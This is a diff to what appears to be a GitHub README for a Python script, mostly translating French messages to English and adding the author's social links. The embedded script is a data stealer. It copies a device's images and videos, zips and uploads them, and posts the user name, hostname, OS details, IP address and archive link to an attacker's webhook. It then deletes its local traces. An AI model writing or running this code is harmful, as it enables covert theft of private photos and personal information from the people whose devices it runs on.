@@ -21,7 +21,6 @@ wh00k = "YOUR_WBK_URL"
 ```python
 wh00k = "YOUR_WBK_URL"
 
-
 import os
 import platform
 import zipfile
@@ -71,7 +70,7 @@ def copier(directory_path):
     for root, dirs, files in os.walk(directory_path):
         for file in files:
             if taille_images_gb > max_go:
-                print(COLOR_MAGENTA + "Images recuperées, Téléchargement.")
+                print(COLOR_MAGENTA + "[+] Recovered files, Downloading.")
                 return 
             if count_per_directory >= max_fichiers:
 
@@ -84,7 +83,7 @@ def copier(directory_path):
 
                 taille_mo = os.path.getsize(source_path) / (1024 * 1024)
                 if taille_mo > 60:
-                    print(COLOR_RED + f"[-] Le fichier {file} dépasse la taille limite (60 Mo).")
+                    print(COLOR_RED + f"[-] The {file} file exceeds the size limit (60 MB).")
                     continue 
 
                 if os.path.abspath(source_path) != os.path.abspath(destination_path):
@@ -93,7 +92,7 @@ def copier(directory_path):
                         count_per_directory += 1
                         taille_images_gb = taille_dossier(dossier_img)
                         prcent = taille_images_gb*100
-                        print(COLOR_GREEN + f"Images / videos trouvées: {prcent:.2f} %")
+                        print(COLOR_GREEN + f"Images / videos found: {prcent:.2f} %")
                     except PermissionError as e:
                         print(COLOR_RED + "[*]")
                 else:
@@ -123,25 +122,23 @@ with open(fichier_zip, "rb") as file:
 message = {
     "embeds": [
         {
-            "title": "Images trouvées sur l'appareil",
+            "title": "Images found on the device",
             "color": 000000000,
             "fields": [
-                {"name": "Utilisateur", "value": informations["Utilisateur"], "inline": True},
-                {"name": "Nom d'hôte", "value": informations["nom d'hôte"], "inline": True},
-                {"name": "Système d'exploitation", "value": informations["Système d'exploitation"], "inline": True},
-                {"name": "Version du système d'exploitation", "value": informations["Version du système d'exploitation"], "inline": True},
-                {"name": "Adresse IP", "value": informations["Adresse IP"], "inline": True},
-                {"name": "Lien du fichier ZIP", "value": data["data"]["downloadPage"], "inline": False}
+                {"name": "User", "value": informations["Utilisateur"], "inline": True},
+                {"name": "Host name", "value": informations["nom d'hôte"], "inline": True},
+                {"name": "Operating system", "value": informations["Système d'exploitation"], "inline": True},
+                {"name": "Version of operating system", "value": informations["Version du système d'exploitation"], "inline": True},
+                {"name": "Ip adress", "value": informations["Adresse IP"], "inline": True},
+                {"name": "ZIP file link", "value": data["data"]["downloadPage"], "inline": False}
             ]
         }
     ]
 }
 response = requests.post(wh00k, json=message)
-print(COLOR_GREEN + "[++] Téléchargement terminé.") 
+print(COLOR_GREEN + "[++] Download complete.") 
 shutil.rmtree(dossier_img)
 os.remove("images.zip") 
-
-
 ```
 
 </details>
@@ -156,4 +153,12 @@ os.remove("images.zip")
 - This script copies image and video files from the specified directory to a destination folder.
 - It then creates a ZIP file from the copied images and videos.
 - Finally, it uploads the ZIP file to the specified file upload service and sends a notification via the webhook.
+
+## subscribe !
+<details>
+    <summary>click to see my differents accouts</summary>
+    - tiktok: [douxx.py](https://tiktok.com/@douxx.py)
+    - discord: [douxx.py](https://discord.gg/dXMnMsEuG4)
+    - github: [douxxu](https://github.com/douxxu)
+</details>
 
